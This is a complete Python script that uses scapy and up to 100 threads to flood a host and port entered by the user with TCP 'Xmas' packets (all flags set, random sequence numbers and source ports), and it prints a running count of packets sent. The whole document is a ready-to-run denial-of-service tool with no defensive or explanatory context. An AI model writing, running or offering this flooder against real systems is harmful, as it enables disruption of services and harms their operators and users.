from scapy.all import *
import threading
import time

sent = 0

active_threads = 0
max_threads = 100

def xmas(host, port):
    try:
        global active_threads
        global sent
        active_threads += 1
        packet = IP(dst=host) / TCP(dport=port, flags="FSRPAUEC", seq=RandShort(), ack=RandShort(), sport=RandShort())
        while True:
            send(packet, verbose=0)
            sent += 1
    except Exception:
        pass
    finally:
        active_threads -= 1

def verbose():
    while True:
        time.sleep(1)
        print(f"Sent -> {sent}")

host = input("Host: ")
port = int(input("Port: "))

threading.Thread(target=verbose, daemon=True).start()
while True:
    if active_threads >= max_threads:
        continue
    threading.Thread(target=xmas, args=[host, port], daemon=True).start()
